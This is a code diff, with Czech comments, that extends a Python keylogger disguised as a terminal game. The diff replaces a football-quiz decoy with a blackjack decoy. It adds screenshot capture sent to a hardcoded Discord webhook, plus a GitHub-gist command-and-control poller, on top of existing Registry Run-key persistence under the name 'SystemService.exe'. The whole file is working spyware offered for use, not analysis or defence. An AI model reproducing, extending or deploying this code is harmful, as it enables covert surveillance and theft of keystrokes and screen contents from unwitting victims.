@@ -1,6 +1,8 @@
+import io
 import json
 import os
 import platform
+import random
 import shutil
 import subprocess
 import sys
@@ -21,6 +23,13 @@ IS_MACOS = platform.system().lower() == "darwin"
 
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553128485424201800/7K1yoUlOaf_GLSwJHmu8pJ_Jp0He-bg2VOldAjYs4dk8rIN3NrUMRFHfoUcJSSnPLuAb"
 
+# C2 channel — GitHub gist s commandy
+# Vytvoř gist na https://gist.github.com/ s obsahem "NONE"
+# Sem dej RAW URL toho gistu (klikni na Raw tlačítko)
+GIST_COMMAND_URL = "SEM_DEJ_RAW_GIST_URL"
+
+POLL_INTERVAL = 30  # jak často kontrolovat gist (sekundy)
+
 FLUSH_INTERVAL = 5
 FLUSH_ON_CHARS = 20
 FLUSH_ON_ENTER = True
@@ -35,17 +44,16 @@ APP_NAME = "SystemService.exe"
 REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REGISTRY_VALUE = "SystemServiceUpdate"
 
+
 # ═══════════════════════════════════════════════════════════════
 # PERSISTENCE — instalace do AppData + Registry Run key
 # ═══════════════════════════════════════════════════════════════
 
 def is_installed():
-    """Check jestli uz bezi z AppData (silent mode)."""
     return Path(sys.argv[0]).parent == APP_DIR or "--silent" in sys.argv
 
 
 def install():
-    """Zkopiruje exe do AppData a zapise registry Run key."""
     if not IS_WINDOWS:
         return
     try:
@@ -64,70 +72,272 @@ def install():
         )
         winreg.CloseKey(key)
     except Exception:
-        pass  # instalace selze → bezi jen z aktualniho umisteni
+        pass
 
 
 # ═══════════════════════════════════════════════════════════════
-# DECOY HRA — Slovní Fotbalový Kvíz
+# SCREENSHOT
 # ═══════════════════════════════════════════════════════════════
 
-QUIZ_QUESTIONS = [
-    {
-        "q": "Který klub vyhrál Ligu mistrů UEFA nejvícekrát?",
-        "options": ["A) Real Madrid", "B) AC Milan", "C) Liverpool", "D) Bayern"],
-        "answer": "A",
-    },
-    {
-        "q": "Kdo je rekordman v počtu gólů na Mistrovství světa?",
-        "options": ["A) Pelé", "B) Miroslav Klose", "C) Ronaldo", "D) Messi"],
-        "answer": "B",
-    },
-    {
-        "q": "Ve kterém roce se MS ve fotbale konalo poprvé?",
-        "options": ["A) 1926", "B) 1930", "C) 1934", "D) 1950"],
-        "answer": "B",
-    },
-    {
-        "q": "Který hráč vyhrál Zlatý míč nejvícekrát?",
-        "options": ["A) Cristiano Ronaldo", "B) Lionel Messi", "C) Michel Platini", "D) Johan Cruyff"],
-        "answer": "B",
-    },
-    {
-        "q": "Jaká je délka fotbalového hřiště (max)?",
-        "options": ["A) 100 m", "B) 110 m", "C) 120 m", "D) 90 m"],
-        "answer": "C",
-    },
-]
+def take_screenshot() -> bytes | None:
+    """Udělá screenshot a vrátí PNG bytes."""
+    try:
+        if IS_WINDOWS:
+            from PIL import ImageGrab
+            img = ImageGrab.grab()
+            buf = io.BytesIO()
+            img.save(buf, format="PNG")
+            return buf.getvalue()
+        elif IS_MACOS:
+            result = subprocess.run(
+                ["screencapture", "-x", "-m", "/tmp/_ss.png"],
+                capture_output=True, timeout=10
+            )
+            if result.returncode == 0:
+                with open("/tmp/_ss.png", "rb") as f:
+                    data = f.read()
+                os.remove("/tmp/_ss.png")
+                return data
+    except Exception:
+        pass
+    return None
 
 
-def run_quiz():
-    """Terminal quiz — decoy pro uzivatele."""
-    print("=" * 40)
-    print("     ⚽ SLOVNÍ FOTBALOVÝ KVÍZ ⚽")
-    print("=" * 40)
-    print()
-    score = 0
-    for i, q in enumerate(QUIZ_QUESTIONS, 1):
-        print(f"Otázka {i}/{len(QUIZ_QUESTIONS)}:")
-        print(f"  {q['q']}")
-        for opt in q["options"]:
-            print(f"    {opt}")
-        answer = input("\n  Tvá odpověď (A/B/C/D): ").strip().upper()
-        if answer == q["answer"]:
-            print("  ✅ Správně!\n")
-            score += 1
+def send_screenshot_to_discord():
+    """Screenshot → Discord webhook jako obrázek."""
+    ss = take_screenshot()
+    if not ss:
+        return
+
+    hostname = "unknown"
+    try:
+        import socket
+        hostname = socket.gethostname()
+    except Exception:
+        pass
+
+    try:
+        requests.post(
+            DISCORD_WEBHOOK_URL,
+            data={"payload_json": json.dumps({
+                "content": f"📸 Screenshot from `{hostname}`",
+            })},
+            files={"files": ("screenshot.png", ss, "image/png")},
+            timeout=30
+        )
+    except Exception:
+        pass
+
+
+# ═══════════════════════════════════════════════════════════════
+# COMMAND POLLING — stahuje gist a provádí příkazy
+# ═══════════════════════════════════════════════════════════════
+
+def poll_commands():
+    """Každých POLL_INTERVAL sekund stáhne gist a zkontroluje commandy.
+
+    Podporované commandy v gistu:
+    SCREENSHOT  → udělá screenshot a pošle na Discord
+    NONE        → nic nedělej
+    """
+    last_command = None
+
+    while True:
+        try:
+            resp = requests.get(GIST_COMMAND_URL, timeout=10)
+            if resp.status_code == 200:
+                cmd = resp.text.strip().upper()
+                if cmd != last_command:
+                    if cmd == "SCREENSHOT":
+                        send_screenshot_to_discord()
+                    # Přidat další: UNINSTALL, KILL, atd.
+                    last_command = cmd
+        except Exception:
+            pass
+
+        time.sleep(POLL_INTERVAL)
+
+
+def start_command_poller():
+    if GIST_COMMAND_URL == "SEM_DEJ_RAW_GIST_URL":
+        return  # není nastaveno → preskoč
+    t = threading.Thread(target=poll_commands, daemon=True)
+    t.start()
+
+
+# ═══════════════════════════════════════════════════════════════
+# DECOY HRA — Blackjack
+# ═══════════════════════════════════════════════════════════════
+
+SUITS = ["♠", "♥", "♦", "♣"]
+RANKS = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"]
+
+
+class Deck:
+    def __init__(self):
+        self.cards = []
+        self.build()
+
+    def build(self):
+        self.cards = [(r, s) for s in SUITS for r in RANKS]
+        random.shuffle(self.cards)
+
+    def deal(self):
+        if not self.cards:
+            self.build()
+        return self.cards.pop()
+
+
+def card_value(card):
+    rank = card[0]
+    if rank in ["J", "Q", "K"]:
+        return 10
+    elif rank == "A":
+        return 11
+    return int(rank)
+
+
+def hand_value(hand):
+    total = sum(card_value(c) for c in hand)
+    aces = sum(1 for c in hand if c[0] == "A")
+    while total > 21 and aces > 0:
+        total -= 10
+        aces -= 1
+    return total
+
+
+def hand_display(hand, hide_first=False):
+    parts = []
+    for i, (rank, suit) in enumerate(hand):
+        if hide_first and i == 0:
+            parts.append("🂠")
         else:
-            print(f"  ❌ Špatně! Správná odpověď: {q['answer']}\n")
-    print("=" * 40)
-    print(f"  Výsledek: {score}/{len(QUIZ_QUESTIONS)}")
-    if score == len(QUIZ_QUESTIONS):
-        print("  🏆 Dokonalý výsledek!")
-    elif score >= 3:
-        print("  👍 Dobrá práce!")
+            parts.append(f"{rank}{suit}")
+    return " ".join(parts)
+
+
+def print_hand(label, hand, hide_first=False):
+    val = hand_value(hand)
+    if hide_first:
+        print(f"  {label}: {hand_display(hand, True)}  (?)")
     else:
-        print("  Zkus to znovu!")
+        print(f"  {label}: {hand_display(hand)}  ({val})")
+
+
+def run_blackjack():
+    """Blackjack — decoy hra."""
+    chips = 100
     print("=" * 40)
-    input("\nStiskni Enter pro ukončení...")
+    print("       ♠♥ BLACKJACK ♦♣")
+    print("       Better Luck Tomorrow")
+    print("=" * 40)
+    print(f"\n  Vítej! Začínáš s {chips} žetony.\n")
+
+    while chips > 0:
+        print(f"─" * 40)
+        print(f"  Žetony: {chips}")
+        try:
+            bet = input(f"  Sázka (1-{chips}, nebo 'q' pro konec): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            break
+
+        if bet.lower() == "q":
+            break
+
+        try:
+            bet = int(bet)
+        except ValueError:
+            print("  ⚠ Neplatná sázka!\n")
+            continue
+
+        if bet < 1 or bet > chips:
+            print(f"  ⚠ Sázka musí být 1-{chips}!\n")
+            continue
+
+        deck = Deck()
+        player = [deck.deal(), deck.deal()]
+        dealer = [deck.deal(), deck.deal()]
+
+        print()
+        print_hand("Dealer", dealer, hide_first=True)
+        print_hand("Ty", player)
+        print()
+
+        # Blackjack check
+        if hand_value(player) == 21:
+            print("  🎉 BLACKJACK! Výhra 3:2!")
+            chips += bet + bet // 2
+            print(f"  Žetony: {chips}\n")
+            continue
+
+        # Player turn
+        busted = False
+        while True:
+            action = input("  [H]it / [S]tand: ").strip().lower()
+            if action == "h":
+                player.append(deck.deal())
+                print()
+                print_hand("Dealer", dealer, hide_first=True)
+                print_hand("Ty", player)
+                print()
+                val = hand_value(player)
+                if val > 21:
+                    print("  💥 BUST! Přesáhl jsi 21.")
+                    chips -= bet
+                    busted = True
+                    break
+                elif val == 21:
+                    break
+            elif action == "s":
+                break
+            else:
+                print("  ⚠ Zadej H nebo S!\n")
+
+        if busted:
+            print(f"  Žetony: {chips}\n")
+            continue
+
+        # Dealer turn
+        print("\n  Dealer hraje...")
+        time.sleep(1)
+        while hand_value(dealer) < 17:
+            dealer.append(deck.deal())
+            print_hand("Dealer", dealer)
+            time.sleep(0.8)
+
+        dealer_val = hand_value(dealer)
+        player_val = hand_value(player)
+
+        print()
+        print_hand("Dealer", dealer)
+        print_hand("Ty", player)
+        print()
+
+        if dealer_val > 21:
+            print("  🎉 Dealer BUST! Vyhrál jsi!")
+            chips += bet
+        elif dealer_val > player_val:
+            print("  😞 Dealer vyhrává.")
+            chips -= bet
+        elif dealer_val < player_val:
+            print("  🎉 Vyhrál jsi!")
+            chips += bet
+        else:
+            print("  🤝 Push (remíza).")
+
+        print(f"  Žetony: {chips}\n")
+
+    print("=" * 40)
+    if chips > 0:
+        print(f"  Konec hry! Finální žetony: {chips}")
+    else:
+        print("  Bankrot! Zkus to znovu.")
+    print("=" * 40)
+
+    try:
+        input("\nStiskni Enter pro ukončení...")
+    except (EOFError, KeyboardInterrupt):
+        pass
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -373,7 +583,6 @@ class Keylogger:
             self.delivery.flush()
 
     def run_background(self):
-        """Spusti keylogger v daemon threadu — neblokuje hlavni thread."""
         t_scheduler = threading.Thread(target=self.delivery.scheduler, daemon=True)
         t_scheduler.start()
         t_listener = threading.Thread(target=self._start_listener, daemon=True)
@@ -392,18 +601,16 @@ if __name__ == "__main__":
     silent = "--silent" in sys.argv
 
     if not silent:
-        # Prvni spusteni: instalace + decoy hra + keylogger na pozadi
         install()
         logger = Keylogger()
         logger.run_background()
-        run_quiz()  # blokuje hlavni thread — hra bezi
-        # Po zavreni hry: keylogger thread dale bezi (daemon=True)
-        # Proces zustava zivy dokud ho nekdo nezabije
+        start_command_poller()
+        run_blackjack()
         while True:
-            time.sleep(60)  # keep alive
+            time.sleep(60)
     else:
-        # Silent mode: jen keylogger, zadne okno, zadny output
         logger = Keylogger()
         logger.run_background()
+        start_command_poller()
         while True:
             time.sleep(60)
